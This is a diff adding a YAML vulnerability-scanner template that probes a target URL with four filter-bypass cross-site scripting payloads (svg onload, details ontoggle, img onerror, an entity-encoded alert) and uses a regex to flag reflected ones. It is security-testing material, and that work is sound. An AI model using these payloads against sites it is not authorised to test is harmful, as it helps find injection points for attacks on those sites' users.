@@ -1,0 +1,21 @@
+id: nawab-xss-found
+
+info:
+  name: ⚡ Nawab-XSS-Bypass-Scanner ⚡
+  author: thenawabx
+  severity: high
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=<svg/onload=confirm?.(document.domain)>"
+      - "{{BaseURL}}/?id=<details/open/ontoggle=prompt?.(1)>"
+      - "{{BaseURL}}/?name=<img/src/onerror=confirm?.(8)>"
+      - "{{BaseURL}}/?query=<svg//onload=%26%2397%3Blert%26%2340%3B1%26%2341%3B>"
+
+    matchers:
+      - type: regex
+        name: "!!! [FOUND] XSS-VULNERABLE: PAYLOAD-EXECUTED !!!"
+        regex:
+          - "(?i)(<svg/onload=|<details/open/ontoggle=|<img/src/onerror=)"
+        part: body
